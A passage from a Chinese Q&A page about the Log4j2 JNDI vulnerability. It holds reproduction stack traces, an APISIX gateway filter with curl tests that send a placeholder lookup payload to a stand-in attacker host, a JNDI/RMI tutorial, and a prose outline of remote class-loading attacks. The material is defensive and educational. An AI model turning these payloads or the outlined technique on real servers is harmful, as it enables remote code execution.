+LdapClient.getSearchReply(LdapRequest,int,LdapResult,Hashtable) (/java.naming/com.sun.jndi.ldap/LdapClient.class:639)
+LdapClient.search(String,int,int,int,int,boolean,String\[\],String,int,Control\[\],Hashtable,boolean,int) (/java.naming/com.sun.jndi.ldap/LdapClient.class:562)
+LdapCtx.doSearch(Name,String,SearchControls,boolean,boolean) (/java.naming/com.sun.jndi.ldap/LdapCtx.class:2014)
+LdapCtx.doSearchOnce(Name,String,SearchControls,boolean) (/java.naming/com.sun.jndi.ldap/LdapCtx.class:1962)
+LdapCtx.c\_lookup(Name,Continuation) (/java.naming/com.sun.jndi.ldap/LdapCtx.class:1056)
+ComponentContext.p\_lookup(Name,Continuation) (/java.naming/com.sun.jndi.toolkit.ctx/ComponentContext.class:542)
+PartialCompositeContext.lookup(Name) (/java.naming/com.sun.jndi.toolkit.ctx/PartialCompositeContext.class:177)
+GenericURLContext.lookup(String) (/java.naming/com.sun.jndi.toolkit.url/GenericURLContext.class:207)
+ldapURLContext.lookup(String) (/java.naming/com.sun.jndi.url.ldap/ldapURLContext.class:94)
+InitialContext.lookup(String) (/java.naming/javax.naming/InitialContext.class:409)
+JndiManager.lookup(String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.net/JndiManager.class:172)
+JndiLookup.lookup(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/JndiLookup.class:56)
+Interpolator.lookup(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/Interpolator.class:223)
+StrSubstitutor.resolveVariable(LogEvent,String,StringBuilder,int,int) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:1116)
+StrSubstitutor.substitute(LogEvent,StringBuilder,int,int,List) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:1038)
+StrSubstitutor.substitute(LogEvent,StringBuilder,int,int) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:912)
+StrSubstitutor.replace(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:467)
+MessagePatternConverter.format(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.pattern/MessagePatternConverter.class:132)
+PatternFormatter.format(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.pattern/PatternFormatter.class:38)
+PatternLayout$PatternSerializer.toSerializable(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:345)
+PatternLayout.toText(AbstractStringLayout$Serializer2,LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:244)
+PatternLayout.encode(LogEvent,ByteBufferDestination) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:229)
+PatternLayout.encode(Object,ByteBufferDestination) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:59)
+AbstractOutputStreamAppender.directEncodeEvent(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:197)
+AbstractOutputStreamAppender.tryAppend(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:190)
+AbstractOutputStreamAppender.append(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:181)
+AppenderControl.tryCallAppender(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:156)
+AppenderControl.callAppender0(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:129)
+AppenderControl.callAppenderPreventRecursion(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:120)
+AppenderControl.callAppender(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:84)
+LoggerConfig.callAppenders(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:543)
+LoggerConfig.processLogEvent(LogEvent,LoggerConfig$LoggerConfigPredicate) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:502)
+LoggerConfig.log(LogEvent,LoggerConfig$LoggerConfigPredicate) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:485)
+LoggerConfig.log(String,String,StackTraceElement,Marker,Level,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:460)
+DefaultReliabilityStrategy.log(Supplier,String,String,StackTraceElement,Marker,Level,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/DefaultReliabilityStrategy.class:63)
+Logger.log(Level,Marker,String,StackTraceElement,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core/Logger.class:161)
+AbstractLogger.tryLogMessage(String,StackTraceElement,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2198)
+AbstractLogger.logMessageTrackRecursion(String,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2152)
+AbstractLogger.logMessageSafely(String,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2135)
+AbstractLogger.logMessage(String,Level,Marker,String,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2011)
+AbstractLogger.logIfEnabled(String,Level,Marker,String,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:1983)
+AbstractLogger.error(String) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:740)
+Self.main(String\[\]) (/Users/xialu/Downloads/repo/java-test/log4j\_program/src/Self.java:6)
+
+</code></pre><p>工厂方法被调用的 stack trace</p>
+<pre tabindex=0><code>MyFactory.getObjectInstance(Object,Name,Context,Hashtable) (/Users/xialu/Downloads/repo/java-test/log4j\_program/src/MyFactory.java:27)
+DirectoryManager.getObjectInstance(Object,Name,Context,Hashtable,Attributes) (/rt.jar/javax.naming.spi/DirectoryManager.class:194)
+LdapCtx.c\_lookup(Name,Continuation) (/rt.jar/com.sun.jndi.ldap/LdapCtx.class:1113)
+ComponentContext.p\_lookup(Name,Continuation) (/rt.jar/com.sun.jndi.toolkit.ctx/ComponentContext.class:542)
+PartialCompositeContext.lookup(Name) (/rt.jar/com.sun.jndi.toolkit.ctx/PartialCompositeContext.class:177)
+GenericURLContext.lookup(String) (/rt.jar/com.sun.jndi.toolkit.url/GenericURLContext.class:205)
+ldapURLContext.lookup(String) (/rt.jar/com.sun.jndi.url.ldap/ldapURLContext.class:94)
+InitialContext.lookup(String) (/rt.jar/javax.naming/InitialContext.class:417)
+JndiManager.lookup(String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.net/JndiManager.class:172)
+JndiLookup.lookup(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/JndiLookup.class:56)
+Interpolator.lookup(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/Interpolator.class:223)
+StrSubstitutor.resolveVariable(LogEvent,String,StringBuilder,int,int) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:1116)
+StrSubstitutor.substitute(LogEvent,StringBuilder,int,int,List) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:1038)
+StrSubstitutor.substitute(LogEvent,StringBuilder,int,int) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:912)
+StrSubstitutor.replace(LogEvent,String) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.lookup/StrSubstitutor.class:467)
+MessagePatternConverter.format(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.pattern/MessagePatternConverter.class:132)
+PatternFormatter.format(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.pattern/PatternFormatter.class:38)
+PatternLayout$PatternSerializer.toSerializable(LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:345)
+PatternLayout.toText(AbstractStringLayout$Serializer2,LogEvent,StringBuilder) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:244)
+PatternLayout.encode(LogEvent,ByteBufferDestination) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:229)
+PatternLayout.encode(Object,ByteBufferDestination) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.layout/PatternLayout.class:59)
+AbstractOutputStreamAppender.directEncodeEvent(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:197)
+AbstractOutputStreamAppender.tryAppend(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:190)
+AbstractOutputStreamAppender.append(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.appender/AbstractOutputStreamAppender.class:181)
+AppenderControl.tryCallAppender(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:156)
+AppenderControl.callAppender0(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:129)
+AppenderControl.callAppenderPreventRecursion(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:120)
+AppenderControl.callAppender(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/AppenderControl.class:84)
+LoggerConfig.callAppenders(LogEvent) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:543)
+LoggerConfig.processLogEvent(LogEvent,LoggerConfig$LoggerConfigPredicate) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:502)
+LoggerConfig.log(LogEvent,LoggerConfig$LoggerConfigPredicate) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:485)
+LoggerConfig.log(String,String,StackTraceElement,Marker,Level,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/LoggerConfig.class:460)
+DefaultReliabilityStrategy.log(Supplier,String,String,StackTraceElement,Marker,Level,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core.config/DefaultReliabilityStrategy.class:63)
+Logger.log(Level,Marker,String,StackTraceElement,Message,Throwable) (/log4j-core-2.13.3.jar/org.apache.logging.log4j.core/Logger.class:161)
+AbstractLogger.tryLogMessage(String,StackTraceElement,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2198)
+AbstractLogger.logMessageTrackRecursion(String,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2152)
+AbstractLogger.logMessageSafely(String,Level,Marker,Message,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2135)
+AbstractLogger.logMessage(String,Level,Marker,String,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:2011)
+AbstractLogger.logIfEnabled(String,Level,Marker,String,Throwable) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:1983)
+AbstractLogger.error(String) (/log4j-api-2.13.3.jar/org.apache.logging.log4j.spi/AbstractLogger.class:740)
+Self.main(String\[\]) (/Users/xialu/Downloads/repo/java-test/log4j\_program/src/Self.java:6)
+
+</code></pre><hr>
+<p>高版本禁止调用远程代码了，但这个漏洞仍然影响大，因为可以调用本地代码，这个本地代码可能可以创建对象，从而被恶意利用，干任何事。</p>
+<p>这个可以利用的本地代码可以是，<strong>org.apache.naming.factory.BeanFactory （见</strong> <a href="https://link.zhihu.com/?target=https%3A//www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java | Veracode</a>）</p>
+<p>作为不怎么写 Java 的，就不去试试这个特定的代码了。本地已经证明这个是可行的。</p>
+<h3 id=知乎用户-诗与星空-发表>知乎用户 诗与星空​​ 发表</h3>
+<p>排查完了。</p>
+<p>所以说，企业上云是唯一的选择。</p>
+<h3 id=知乎用户-leekea-发表>知乎用户 Leekea 发表</h3>
+<p>笑死，一上班火急火燎问组长我们不会要加班吧，然后旁边人让我放心，我们用的还是 1. 几的版本，根本没影响。</p>
+<h3 id=知乎用户-apacheapisix-中国社区-发表>知乎用户 ApacheAPISIX 中国社区 发表</h3>
+<p>近日网络上曝光了 Apache Log4j2 的<a href="https://www.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265331041%7D">远程代码执行</a>漏洞。该漏洞在 Apache Log4j2 的开发团队完全修复之前提前曝光，导致在野利用，使用 Log4j2 的 2.x 至 2.14.1 的版本的项目均有被攻击风险。</p>
+<h2 id=漏洞利用分析>漏洞利用分析</h2>
+<p>从该漏洞复现过程我们可以分析出，利用该漏洞的关键步骤是构造恶意的 payload，类似于</p>
+<pre tabindex=0><code>{xxxxx//attacker.com/a}
+
+</code></pre><p>在官方发布完全修复版本以及当前环境升至修复版本之前，需要一种临时措施来拦截携带改恶意负载的请求，保护服务不受该漏洞的在野攻击。</p>
+<h2 id=apache-apisix-应对措施>Apache APISIX 应对措施</h2>
+<p>我们可以在 Apache APISIX 上过滤请求负载，用正则匹配恶意的 payload 的关键词，并对其进行拦截。</p>
+<p>假设 payload 的关键字为 &ldquo;xxxxx&rdquo;，可以用 serverless 插件执行自定义拦截脚本，配置示例如下：</p>
+<pre tabindex=0><code>curl http://127.0.0.1:9080/apisix/admin/routes/1 -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
+{
+    &quot;uri&quot;: &quot;/\*&quot;,
+    &quot;plugins&quot;:{
+        &quot;serverless-pre-function&quot;:{
+            &quot;phase&quot;:&quot;rewrite&quot;,
+            &quot;functions&quot;:\[
+                &quot;return function(conf, ctx) local core = require(\\&quot;apisix.core\\&quot;); local payload, err = core.request.get\_body(); if not payload then local uri\_args, err = core.request.get\_uri\_args(ctx)\\n if uri\_args then payload = core.json.encode(uri\_args, true) end; end; local m = ngx.re.match(payload, \\&quot;xxxxx\\&quot;, \\&quot;jo\\&quot;); if m then ngx.exit(403) end; end&quot;
+            \]
+        }
+    },
+    &quot;upstream&quot;: {
+        &quot;type&quot;: &quot;roundrobin&quot;,
+        &quot;nodes&quot;: {
+            &quot;127.0.0.1:1980&quot;: 1
+        }
+    }
+}'
+
+</code></pre><p>注意：上述配置中 <code>serverless-pre-function</code> 相关的配置是自定义脚本部分。其他配置为 Apache APISIX 常规配置，请根据实际情况调整。</p>
+<p>上述 functions 字段对应的脚本中主要做了以下事情</p>
+<ol>
+<li>提取请求负载（包括 GET 请求的 URL 传参方式和 POST/PUT 请求体传参方式）</li>
+<li>正则匹配恶意负载</li>
+<li>拦截携带恶意负载的请求</li>
+</ol>
+<p>该脚本提供了处理此类恶意负载请求的实现思路，主要是进行捕获攻击特征，比如 <code>jndi</code> 关键字等。大家可以根据自己的需求，对该脚本进行完善或者优化。</p>
+<h2 id=验证>验证</h2>
+<p><strong>拦截在 GET 请求参数中携带恶意负载</strong>：</p>
+<pre tabindex=0><code>curl -I 'http://127.0.0.1:9080/hello?foo=${xxxxx//attacker.com/a}'
+HTTP/1.1 403 Forbidden
+……
+
+</code></pre><p><strong>拦截在 POST 请求体 (application/json) 中携带恶意负载</strong>：</p>
+<pre tabindex=0><code>curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: application/json' -X POST -d '
+{
+  &quot;foo&quot;: &quot;${xxxxx//attacker.com/a}&quot;
+}'
+HTTP/1.1 403 Forbidden
+……
+
+</code></pre><p><strong>拦截在 POST 请求体 (text/plain) 中携带恶意负载</strong>：</p>
+<pre tabindex=0><code>curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: text/plain' -X POST -d '
+{xxxxx//attacker.com/a}'
+HTTP/1.1 403 Forbidden
+……
+
+</code></pre><p><strong>拦截在 POST 请求体 (application/x-www-form-urlencoded，不对请求体进行 URL 编码) 中携带恶意负载</strong>：</p>
+<pre tabindex=0><code>curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '
+foo=${xxxxx//attacker.com/a}'
+HTTP/1.1 403 Forbidden
+……
+
+</code></pre><h2 id=关于-apache-apisix>关于 Apache APISIX</h2>
+<p>Apache APISIX 是一个动态、实时、高性能的开源 API 网关，提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX 可以帮助企业快速、安全地处理 API 和微服务流量，包括网关、Kubernetes Ingress 和服务网格等。</p>
+<p><strong>Apache APISIX 落地用户（仅部分）</strong></p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-4957bcfa4b3f47971d8a177cc860e95b_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<ul>
+<li>Apache APISIX GitHub：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/apisix">https://github.com/apache/apisix</a></li>
+<li>Apache APISIX 官网：<a href="https://link.zhihu.com/?target=https%3A//apisix.apache.org/">https://apisix.apache.org/</a></li>
+<li>Apache APISIX 文档：<a href="https://link.zhihu.com/?target=https%3A//apisix.apache.org/zh/docs/apisix/getting-started">https://apisix.apache.org/zh/docs/apisix/getting-started</a></li>
+</ul>
+<h3 id=知乎用户--沉默王二-发表>知乎用户 沉默王二​ 发表</h3>
+<p><strong>重现了一波 Log4j2 核弹级漏洞，同事的电脑沦为炮灰。</strong></p>
+<p>大概你也已经听说了，造成 Log4j2 核弹级漏洞的” 罪魁祸首 “是 JNDI，我们就来聊聊它吧。本篇回答通过对 Log4j2 漏洞的分析，不仅带大家了解了 JNDI 的基础知识，而且完美重现了一次基于 JNDI 的工具。</p>
+<p>以下内容来自我的好朋友二师兄，想看原文的可以戳这里：<a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zXzJVxRxMUnoyJs6_NojMQ">重现了一波 Log4j2 核弹级漏洞，同事的电脑沦为炮灰</a></p>
+<hr>
+<p>说起 JNDI，从事 Java EE 编程的人应该都在用着，但知不知道自己在用，那就看你对技术的钻研深度了。这次 Log4j2 曝出漏洞，不正说明大量项目或直接或间接的在用着 JNDI。来看看 JNDI 到底是个什么鬼吧？</p>
+<p>先来看看 Sun 官方的解释：</p>
+<p>Java 命名和目录接口（Java Naming and Directory Interface ，JNDI）是用于从 Java 应用程序中访问名称和目录服务的一组 API。命名服务即将名称与对象相关联，以便能通过相应名称访问这些对象。而目录服务即其对象具有属性及名称的命名服务。<br>
+命名或目录服务允许你集中管理共享信息的存储，这在网络应用程序中很重要，因为它可以使这类应用程序更加一致和易于管理。例如，可以将打印机配置存储在目录服务中，这样所有与打印机相关的应用程序都能够使用它。</p>
+<p>概念是不是很抽象，读了好几遍都没懂？一图胜千言：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pica.zhimg.com/v2-add0498175371482808e88de162f4bb5_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>看着怎么有点注册中心的意思？是的，如果你使用过 Nacos 或读过 Nacos 的源码，Naming Service 这个概念一定很熟悉。在 JNDI 中，虽然实现方式不同、应用场景不同，但并不影响你通过类比注册中心的方式来理解 JNDI。</p>
+<p>如果你说没用过 Nacos，那好，Map 总用过吧。忽略掉 JNDI 与 Map 底层实现的区别，JNDI 提供了一个类似 Map 的绑定功能，然后又提供了基于 lookup 或 search 之类的方法来根据名称查找 Object，好比 Map 的 get 方法。</p>
+<p>总之，JNDI 就是一个规范，规范就需要对应的 API（也就是一些 <strong>Java 类</strong>）来实现。通过这组 API，可以将 Object（对象）和一个名称进行关联，同时提供了基于名称查找 Object 的途径。</p>
+<p>最后，对于 JNDI，SUN 公司只是提供了一个接口规范，具体由对应的服务器来实现。比如，Tomcat 有 Tomcat 的实现方式，JBoss 有 JBoss 的实现方式，遵守规范就好。</p>
+<h3 id=命名服务与目录服务的区别><strong>命名服务与目录服务的区别</strong></h3>
+<p><strong>命名服务</strong>就是上面提到的，类似 Map 的绑定与查找功能。比如：在 Internet 中的域名服务（domain naming service，DNS），就是提供将域名映射到 IP 地址的命名服务，在浏览器中输入域名，通过 DNS 找到相应的 IP 地址，然后访问网站。</p>
+<p><strong>目录服务</strong>是对命名服务的扩展，是一种特殊的命名服务，提供了属性与对象的关联和查找。一个目录服务通常拥有一个命名服务（但是一个命名服务不必具有一个目录服务）。比如电话簿就是一个典型的目录服务，一般先在电话簿里找到相关的人名，再找到这个人的电话号码。</p>
+<p><strong>目录服务</strong>允许属性（比如用户的电子邮件地址）与对象相关联（而命名服务则不然）。这样，使用目录服务时，可以基于对象的属性来搜索它们。</p>
+<h3 id=jndi-架构分层><strong>JNDI 架构分层</strong></h3>
+<p>JNDI 通常分为三层：</p>
+<ul>
+<li>JNDI API：用于与 Java 应用程序与其通信，这一层把应用程序和实际的数据源隔离开来。因此无论应用程序是访问 LDAP、RMI、DNS 还是其他的目录服务，跟这一层都没有关系。</li>
+<li>Naming Manager：也就是我们提到的命名服务；</li>
+<li>JNDI SPI（Server Provider Interface）：用于具体到实现的方法上。</li>
+</ul>
+<p>整体架构分层如下图：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-472fa9daba674193651355a9cdc60fba_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>需要注意的是：JNDI 同时提供了<a href="https://www.zhihu.com/search?q=%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">应用程序编程接口</a>（Application Programming Interface ，API）和服务提供程序接口（Service Provider Interface ，SPI）。</p>
+<p>这样做对于与命名或目录服务交互的应用程序来说，必须存在一个用于该服务的 JNDI 服务提供程序，这便是 JNDI SPI 发挥作用的舞台。</p>
+<p>一个服务提供程序基本上就是一组类，对特定的命名和目录服务实现了各种 JNDI 接口——这与 JDBC <a href="https://www.zhihu.com/search?q=%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">驱动程序</a>针对特定的数据系统实现各种 JDBC 接口极为相似。作为开发人员，不需要担心 JNDI SPI。只需确保为每个要使用的命名或目录服务提供了一个服务提供程序即可。</p>
+<h3 id=jndi-的应用><strong>JNDI 的应用</strong></h3>
+<p>下面再了解一下 JNDI 容器的概念及应用场景。</p>
+<h3 id=jndi-容器环境><strong>JNDI 容器环境</strong></h3>
+<p>JNDI 中的命名（Naming），就是将 Java 对象以某个名称的形式绑定（binding）到一个容器环境（Context）中。当使用时，调用容器环境（Context）的查找（lookup）方法找出某个名称所绑定的 Java 对象。</p>
+<p>容器环境（Context）本身也是一个 Java 对象，它也可以通过一个名称绑定到另一个容器环境（Context）中。将一个 Context 对象绑定到另外一个 Context 对象中，这就形成了一种父子级联关系，多个 Context 对象最终可以级联成一种树状结构，树中的每个 Context 对象中都可以绑定若干个 Java 对象。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-d95208f08fbc5d93292ed64afb44220f_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=jndi-应用><strong>JNDI 应用</strong></h3>
+<p>JNDI 的基本使用操作就是：先创建一个对象，然后放到容器环境中，使用的时候再拿出来。</p>
+<p>此时，你是否疑惑，干嘛这么费劲呢？换句话说，这么费劲能带来什么好处呢？</p>
+<p>在真实应用中，通常是由系统程序或框架程序先将资源对象绑定到 JNDI 环境中，后续在该系统或框架中运行的模块程序就可以从 JNDI 环境中查找这些资源对象了。</p>
+<p>关于 JDNI 与我们实践相结合的一个例子是 JDBC 的使用。在没有基于 JNDI 实现时，连接一个数据库通常需要：加载数据库驱动程序、连接数据库、操作数据库、关闭数据库等步骤。而不同的数据库在对上述步骤的实现又有所不同，参数也可能发生变化。</p>
+<p>如果把这些问题交由 J2EE 容器来配置和管理，程序就只需对这些配置和管理进行引用就可以了。</p>
+<p>以 Tomcat 服务器为例，在启动时可以创建一个连接到某种数据库系统的数据源（DataSource）对象，并将该数据源（DataSource）对象绑定到 JNDI 环境中，以后在这个 Tomcat 服务器中运行的 Servlet 和 JSP 程序就可以从 JNDI 环境中查询出这个<a href="https://www.zhihu.com/search?q=%E6%95%B0%E6%8D%AE%E6%BA%90&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">数据源</a>（DataSource）对象进行使用，而不用关心数据源（DataSource）对象是如何创建出来的。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-d61e7625a36bc59afb564ebd0db5bb47_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>这种方式极大地增强了系统的可维护性，即便当数据库系统的连接参数发生变更时，也与应用程序开发人员无关。JNDI 将一些关键信息放到内存中，可以提高访问效率；通过 JNDI 可以达到解耦的目的，让系统更具可维护性和可扩展性。</p>
+<h2 id=jndi-实战><strong>JNDI 实战</strong></h2>
+<p>有了以上的概念和基础知识，现在可以开始实战了。</p>
+<p>在架构图中，JNDI 的实现层中包含了多种实现方式，这里就基于其中的 RMI 实现来写个实例体验一把。</p>
+<h3 id=基于-rmi-的实现><strong>基于 RMI 的实现</strong></h3>
+<p>RMI 是 Java 中的远程方法调用，基于 Java 的<a href="https://www.zhihu.com/search?q=%E5%BA%8F%E5%88%97%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">序列化</a>和反序列化传递数据。</p>
+<p>可以通过如下代码来搭建一个 RMI 服务：</p>
+<pre tabindex=0><code>// ①定义接口
+public interface RmiService extends Remote {
+ String sayHello() throws RemoteException;
+}
+
+// ②接口实现
+public class MyRmiServiceImpl extends UnicastRemoteObject implements RmiService {
+ protected MyRmiServiceImpl() throws RemoteException {
+ }
+
+ @Override
+ public String sayHello() throws RemoteException {
+  return &quot;Hello World!&quot;;
+ }
+}
+
+// ③服务绑定并启动监听
+public class RmiServer {
+
+ public static void main(String\[\] args) throws Exception {
+  Registry registry = LocateRegistry.createRegistry(1099);
+  System.out.println(&quot;RMI启动，监听：1099 端口&quot;);
+  registry.bind(&quot;hello&quot;, new MyRmiServiceImpl());
+  Thread.currentThread().join();
+ }
+}
+
+
+</code></pre><p>上述代码先定义了一个 RmiService 的接口，该接口实现了 Remote，并对 RmiService 接口进行了实现。在实现的过程中继承了 UnicastRemoteObject 的具体服务实现类。</p>
+<p>最后，在 RmiServer 中通过 Registry 监听 1099 端口，并将 RmiService 接口的实现类进行了绑定。</p>
+<p>下面构建客户端访问：</p>
+<pre tabindex=0><code>public class RmiClient {
+
+ public static void main(String\[\] args) throws Exception {
+  Hashtable env = new Hashtable();
+  env.put(Context.INITIAL\_CONTEXT\_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+  env.put(Context.PROVIDER\_URL, &quot;rmi://localhost:1099&quot;);
+  Context ctx = new InitialContext(env);
+  RmiService service = (RmiService) ctx.lookup(&quot;hello&quot;);
+  System.out.println(service.sayHello());
+ }
+}
+
+
+</code></pre><p>其中，提供了两个参数<code>Context.INITIAL_CONTEXT_FACTORY</code>、<code>Context.PROVIDER_URL</code>，分别表示 Context <a href="https://www.zhihu.com/search?q=%E5%88%9D%E5%A7%8B%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2269395593%7D">初始化</a>的工厂方法和提供服务的 url。</p>
+<p>执行上述程序，就可以获得远程端的对象并调用，这样就实现了 RMI 的通信。当然，这里 Server 和 Client 在同一台机器，就用了”localhost“的，如果是远程服务器，则替换成对应的 IP 即可。</p>
+<h3 id=构建攻击><strong>构建攻击</strong></h3>
+<p>常规来说，如果要构建攻击，只需伪造一个服务器端，返回恶意的序列化 Payload，客户端接收之后触发反序列化。但实际上对返回的类型是有一定的限制的。</p>
+<p>在 JNDI 中，有一个更好利用的方式，涉及到命名引用的概念<code>javax.naming.Reference</code>。</p>
+<p>如果一些本地实例类过大，可以选择一个远程引用，通过远程调用的方式，引用远程的类。这也就是 JNDI 利用 Payload 还会涉及 HTTP 服务的原因。</p>
+<p>RMI 服务只会返回一个命名引用，告诉 JNDI 应用该如何去寻找这个类，然后应用则会去 HTTP 服务下找到对应类的 class 文件并加载。此时，只要将恶意代码写入 static 方法中，则会在类加载时被执行。</p>
+<p>基本流程如下：</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-f242181e4b8697eedaf3a07843466646_r.jpg%3Fsource%3D1940ef5c" alt></p>
